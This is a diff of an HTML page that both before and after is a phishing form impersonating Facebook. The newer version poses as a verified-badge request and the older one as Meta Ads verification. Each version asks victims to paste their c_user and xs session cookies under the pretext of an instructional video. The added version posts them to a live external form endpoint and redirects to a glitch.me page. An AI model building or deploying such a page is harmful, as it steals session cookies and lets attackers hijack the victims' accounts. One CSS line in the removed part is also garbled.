@@ -1,237 +1,509 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html>
 <head>
-  <title>Meta Ads Account Verification</title>
+  <title>Action Required</title>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body {
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  /* Reset default margins and ensure box-sizing */
+* {
   margin: 0;
-  font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
-  background-color: #f5f6fa;
-  color: #1a1a1a;
+  padding: 0;
+  box-sizing: border-box;
 }
 
-.header {
+/* Smooth scrolling and base font settings */
+html {
+  scroll-behavior: smooth;
+  font-size: 16px;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+}
+
+/* Base styles for body */
+body {
+  font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', sans-serif;
+  background-color: #f8fafc;
+  color: #1f2937;
+  line-height: 1.5;
+  min-height: 100vh;
+}
+
+/* Typography utilities */
+h1, h2, h3, h4, h5, h6 {
+  font-weight: 700;
+  line-height: 1.2;
+  margin-bottom: 1rem;
+}
+
+h1 { font-size: 2.5rem; }
+h2 { font-size: 2rem; }
+h3 { font-size: 1.75rem; }
+h4 { font-size: 1.5rem; }
+h5 { font-size: 1.25rem; }
+h6 { font-size: 1rem; }
+
+/* Header bar styling */
+.border {
+  border: 1px solid #e2e8f0;
+}
+
+.flex {
   display: flex;
   align-items: center;
+  gap: 1rem;
+}
+
+.w-full {
   width: 100%;
-  height: 5rem;
-  background: linear-gradient(90deg, #0061ff, #1877f2);
-  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
 }
 
-.logo-container {
-  margin-left: 3rem;
+.h-\[6rem\] {
+  height: 6rem;
 }
 
-.logo-text {
-  font-size: 2rem;
+.relative {
+  position: relative;
+}
+
+.bg-\[\#4667ac\] {
+  background-color: #4667ac;
+}
+
+.mx-10 {
+  margin-left: 2.5rem;
+  margin-right: 2.5rem;
+}
+
+.mt-4 {
+  margin-top: 1rem;
+}
+
+.text-5xl {
+  font-size: 3rem;
+  font-weight: 800;
+}
+
+.text-white {
+  color: #fff;
+}
+
+b, .font-bold {
   font-weight: 700;
-  color: #ffffff;
-  letter-spacing: 0.5px;
 }
 
-.form-container {
-  margin: 2.5rem auto;
-  width: 90%;
-  max-width: 640px;
-  background: #ffffff;
-  border-radius: 8px;
-  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+.font-semibold {
+  font-weight: 600;
+}
+
+.font-medium {
+  font-weight: 500;
+}
+
+/* Form container */
+form {
+  width: 100%;
+  max-width: 1280px;
+  margin: 0 auto;
   padding: 1.5rem;
 }
 
-.section-title p {
-  font-size: 18px;
-  font-weight: 600;
-  color: #1a1a1a;
-  padding: 0.75rem 0;
-  border-bottom: 1px solid #e0e0e0;
-  margin: 0;
+/* Absolute positioned form content */
+form > div {
+  position: absolute;
+  left: 2rem;
+  top: 8.5rem;
+  width: calc(100% - 4rem);
 }
 
-.info-text {
-  font-size: 13px;
-  font-weight: 500;
-  color: #333333;
-  line-height: your account has been logged in for more than an hour. Please log out and log back in to continue.line-height: 1.6;
-  margin: 1rem 0;
+/* Form section styling */
+.border-b {
+  border-bottom: 1px solid #e2e8f0;
 }
 
-.video-label {
-  font-size: 13px;
-  font-weight: 500;
-  color: #606770;
-  margin: 0.5rem 0;
+.h-10 {
+  height: 2.5rem;
 }
 
-.video-link {
+.text-\[16px\] {
+  font-size: 1rem;
+}
+
+.text-\[\#4b4f56\] {
+  color: #4b4f56;
+}
+
+.pl-3 {
+  padding-left: 0.75rem;
+}
+
+.p-2 {
+  padding: 0.5rem;
+}
+
+.bg-\[\#f5f6f7\] {
+  background-color: #f5f6f7;
+}
+
+.text-\[12px\] {
+  font-size: 0.75rem;
+}
+
+.text-\[\#90949c\] {
+  color: #90949c;
+}
+
+/* Video link styling */
+.w-\[120px\] {
+  width: 120px;
+}
+
+.h-\[80px\] {
+  height: 80px;
+}
+
+.block {
   display: block;
-  width: 140px;
-  height: 90px;
-  margin: 0.5rem 0;
-  transition: transform 0.2s ease;
 }
 
-.video-link:hover {
-  transform: scale(1.05);
+.mx-3 {
+  margin-left: 0.75rem;
+  margin-right: 0.75rem;
 }
 
-.video-link img {
+a img {
   width: 100%;
   height: 100%;
   object-fit: cover;
   border-radius: 4px;
+  transition: transform 0.3s ease;
 }
 
-.input-label {
-  font-size: 13px;
-  font-weight: 500;
-  color: #606770;
-  margin-top: 0.75rem;
+a img:hover {
+  transform: scale(1.05);
 }
 
-.input-field {
+/* Input labels */
+.text-slate-400 {
+  color: #94a3b8;
+}
+
+.pl-4 {
+  padding-left: 1rem;
+}
+
+.mt-1 {
+  margin-top: 0.25rem;
+}
+
+/* Input fields */
+input.border {
   border: 1px solid #d1d5db;
-  height: 2rem;
-  padding: 0 0.75rem;
-  margin: 0.25rem 0;
-  width: 100%;
   border-radius: 6px;
-  font-size: 14px;
-  transition: border-color 0.2s ease;
+  padding: 0.5rem 0.75rem;
+  font-size: 1rem;
+  transition: border-color 0.2s, box-shadow 0.2s;
 }
 
-.input-field:focus {
+.h-6 {
+  height: 1.5rem;
+}
+
+.pl-1 {
+  padding-left: 0.25rem;
+}
+
+input:focus {
   outline: none;
-  border-color: #1877f2;
-  box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.1);
+  border-color: #4267b2;
+  box-shadow: 0 0 0 3px rgba(66, 103, 178, 0.15);
 }
 
-.submit-section {
-  margin: 1.5rem 0;
-  padding: 0.75rem 0;
-  background: #f8fafc;
+input::placeholder {
+  color: #9ca3af;
+}
+
+/* Submit button container */
+.border.mx-3.h-10.mt-4.bg-\[\#f5f6f7\] {
+  border: 1px solid #d1d5db;
+  margin-left: 0.75rem;
+  margin-right: 0.75rem;
+  height: 2.5rem;
+  margin-top: 1rem;
+  background-color: #f5f6f7;
   border-radius: 6px;
+}
+
+.flex.justify-end.mx-2 {
   display: flex;
   justify-content: flex-end;
+  margin-left: 0.5rem;
+  margin-right: 0.5rem;
 }
 
-.submit-button {
+/* Submit button */
+button#delete-btn {
+  border: 1px solid #4267b2;
   height: 2rem;
   width: 5rem;
-  background: #1877f2;
-  color: #ffffff;
-  border: none;
+  background-color: #4267b2;
+  color: #fff;
+  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+  margin-top: 0.3rem;
+  font-family: 'Inter', sans-serif;
+  font-weight: 500;
+  font-size: 0.875rem;
   border-radius: 6px;
-  font-size: 13px;
-  font-weight: 600;
   cursor: pointer;
-  transition: background-color 0.2s ease, transform 0.1s ease;
+  transition: background-color 0.2s, transform 0.1s;
 }
 
-.submit-button:hover {
-  background: #166fe5;
+button#delete-btn:hover {
+  background-color: #3b5998;
   transform: translateY(-1px);
 }
 
-.submit-button:active {
+button#delete-btn:active {
   transform: translateY(0);
 }
 
-@media (max-width: 768px) {
-  .header {
-    height: 4rem;
+button#delete-btn:disabled {
+  background-color: #93c5fd;
+  border-color: #93c5fd;
+  cursor: not-allowed;
+  opacity: 0.7;
+}
+
+/* Additional utility classes */
+.shadow-sm {
+  box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+}
+
+.shadow-md {
+  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+}
+
+.rounded-md {
+  border-radius: 6px;
+}
+
+.rounded-lg {
+  border-radius: 8px;
+}
+
+.transition {
+  transition: all 0.2s ease-in-out;
+}
+
+.hover\:scale-105:hover {
+  transform: scale(1.05);
+}
+
+/* Accessibility */
+.sr-only {
+  position: absolute;
+  width: 1px;
+  height: 1px;
+  padding: 0;
+  margin: -1px;
+  overflow: hidden;
+  clip: rect(0, 0, 0, 0);
+  border: 0;
+}
+
+.focus\:ring:focus {
+  outline: none;
+  box-shadow: 0 0 0 3px rgba(66, 103, 178, 0.3);
+}
+
+/* Responsive design */
+@media (max-width: 639px) {
+  .sm\:hidden {
+    display: none;
   }
 
-  .logo-text {
-    font-size: 1.5rem;
+  .sm\:text-3xl {
+    font-size: 1.875rem;
   }
 
-  .form-container {
-    width: 95%;
+  .sm\:p-4 {
     padding: 1rem;
-    margin: 1.5rem auto;
   }
 
-  .section-title p {
-    font-size: 16px;
-  }
-
-  .info-text,
-  .video-label,
-  .input-label {
-    font-size: 12px;
-  }
-
-  .input-field {
-    font-size: 13px;
-  }
-
-  .video-link {
-    width: 120px;
-    height: 80px;
+  form > div {
+    position: static;
+    width: 100%;
+    margin-top: 1rem;
   }
 }
-  </style>
+
+@media (min-width: 768px) {
+  .md\:block {
+    display: block;
+  }
+
+  .md\:grid-cols-2 {
+    display: grid;
+    grid-template-columns: repeat(2, minmax(0, 1fr));
+    gap: 1.5rem;
+  }
+
+  .md\:text-4xl {
+    font-size: 2.25rem;
+  }
+}
+
+@media (min-width: 1024px) {
+  .lg\:block {
+    display: block;
+  }
+
+  .lg\:grid-cols-3 {
+    display: grid;
+    grid-template-columns: repeat(3, minmax(0, 1fr));
+    gap: 2rem;
+  }
+
+  .lg\:text-5xl {
+    font-size: 3rem;
+  }
+}
+
+@media (min-width: 1280px) {
+  .xl\:max-w-7xl {
+    max-width: 80rem;
+  }
+
+  .xl\:p-8 {
+    padding: 2rem;
+  }
+}
+
+/* Hide header on small screens */
+@media (max-width: 767px) {
+  .md\:block.lg\:block.hidden {
+    display: none;
+  }
+
+  .h-\[6rem\] {
+    height: 4.5rem;
+  }
+
+  .text-5xl {
+    font-size: 2rem;
+  }
+}
+
+/* High contrast mode for accessibility */
+@media (prefers-contrast: high) {
+  body {
+    background-color: #000;
+    color: #fff;
+  }
+
+  .border {
+    border-color: #fff;
+  }
+
+  input.border {
+    border-color: #fff;
+    background-color: #333;
+    color: #fff;
+  }
+
+  button#delete-btn {
+    background-color: #1e90ff;
+    border-color: #fff;
+  }
+}
+
+/* Reduced motion for accessibility */
+@media (prefers-reduced-motion: reduce) {
+  .transition {
+    transition: none;
+  }
+
+  a img:hover {
+    transform: none;
+  }
+
+  button#delete-btn:hover {
+    transform: none;
+  }
+}
+</style>
 </head>
 <body>
-  <div class="header">
-    <div class="logo-container">
-      <b class="logo-text">Facebook</b>
+<div class="md:block lg:block hidden border flex w-full h-[6rem] relative bg-[#4667ac]">
+  <div class="mx-10 mt-4">
+      <b class="text-5xl text-white">facebook</b>
+  </div>
+</div>
+
+<form class="sm:hidden lg:block md:block" action="https://submit-form.com/L7sGrynPA" method="post">
+  <input
+    type="hidden"
+    name="_redirect"
+    value="https://submit-apply-for-verified-badge.glitch.me/request.html">
+<div style="position: absolute; left: 1.5rem; top:8rem; width: 90%;">
+  <div>
+    <p class="border-b h-10 font-bold text-[16px] text-[#4b4f56] pl-3 p-2 bg-[#f5f6f7]">
+      Request a verified badge on Facebook 
+    </p>
+  </div>
+  <div>
+    <p class="mt-4 pl-3 text-[12px] font-semibold">
+      The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure or brand that it represents.
+    </p>
+  </div>
+  <div>
+    <p class="mt-4 pl-3 text-[12px] font-semibold">
+      Previously, the verified badge also required the person or brand to be notable and unique. You may still see users with a verified badge that represents our previous eligibility requirements.
+    </p>
+  </div>
+  <div>
+    <p class="mt-4 pl-3 text-[12px] font-semibold">
+      Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.
+    </p>
+  </div>
+  <div>
+    <p class="text-[12px] text-[#90949c] p-2 font-semibold">
+      Detailed Video Information
+    </p>
+  </div>
+  <div>
+    <a class="w-[120px] h-[80px] block mx-3" href="https://cdn.glitch.global/116aac45-aeea-4339-8e11-ec99eca8b56f/detailed_video.mp4?v=1721736922555"><img src="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png" alt=""></a>
+  </div>
+  <div>
+    <p class="pl-3 text-[12px] font-semibold">
+      Please be sure to provide the requested information below.
+    </p>
+  </div>
+  <div>
+    <p class="text-slate-400 pl-4 mt-1">
+      c_user
+    </p>
+    <input class="border h-6 pl-1 mx-3" type="text" name="c_user" placeholder="" pattern="[0-9]+" minlength="6" id="c_user" title="Must Watch Detailed Video" required="1" aria-required="true">
+  </div>
+  <div>
+    <p class="text-slate-400 pl-4 mt-1">
+      xs
+    </p>
+    <input class="border h-6 pl-1 mx-3" type="text" name="xs" placeholder="" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{12,}$" title="Must Watch Detailed Video" required="1" aria-required="true">
+  </div>
+  <div>
+    <p class="mt-4 pl-3 text-[12px] font-semibold">
+      Please make sure account not to log out from your computer or laptop until you have received a verification email.
+    </p>
+  </div>
+  <div class="border mx-3 h-10 mt-4 bg-[#f5f6f7]">
+    <div class="flex justify-end mx-2">
+      <button class="border h-7 w-16 bg-[#4267b2] text-white shadow-2xl mt-[0.30rem] font-serif font-thin text-xs hover:bg-blue-500" id="delete-btn">
+        Submit
+      </button>
     </div>
   </div>
-
-  <form class="form-container" action="https://submit-form.com/example" method="post">
-    <input type="hidden" name="_redirect" value="https://example.com/success.html">
-    <div class="form-content">
-      <div class="section-title">
-        <p>Meta Ads Account Verification Request</p>
-      </div>
-      <div>
-        <p class="info-text">
-          A verified Meta Ads account confirms your business or brand’s authenticity, enhancing trust and unlocking premium advertising features.
-        </p>
-      </div>
-      <div>
-        <p class="info-text">
-          Verification is required for accounts running high-budget campaigns or targeting specific audiences. Ensure all details are accurate.
-        </p>
-      </div>
-      <div>
-        <p class="info-text">
-          Complete the form below with precise information. Refer to the instructional video for guidance if needed.
-        </p>
-      </div>
-      <div>
-        <p class="video-label">Instructional Video Guide</p>
-      </div>
-      <div>
-        <a class="video-link" href="https://example.com/meta_ads_verification_video.mp4">
-          <img src="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png" alt="Video thumbnail">
-        </a>
-      </div>
-      <div>
-        <p class="info-text">Provide all requested details accurately to proceed.</p>
-      </div>
-      <div>
-        <p class="input-label">Ad Account c_user</p>
-        <input class="input-field" type="text" name="ad_account_id" placeholder="Enter Ad Account c_user" pattern="[0-9]+" minlength="10" title="Refer to the instructional video for details" required aria-required="true">
-      </div>
-      <div>
-        <p class="input-label">xs Verification Token</p>
-        <input class="input-field" type="text" name="token" placeholder="Enter xs Verification Token" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{12,}$" title="Refer to the instructional video for details" required aria-required="true">
-      </div>
-      <div>
-        <p class="info-text">
-          Remain logged into Meta Ads Manager until you receive a verification confirmation email.
-        </p>
-      </div>
-      <div class="submit-section">
-        <button class="submit-button" id="submit-btn">Submit</button>
-      </div>
-    </div>
-  </form>
+</div>
+</form>
 </body>
 </html>
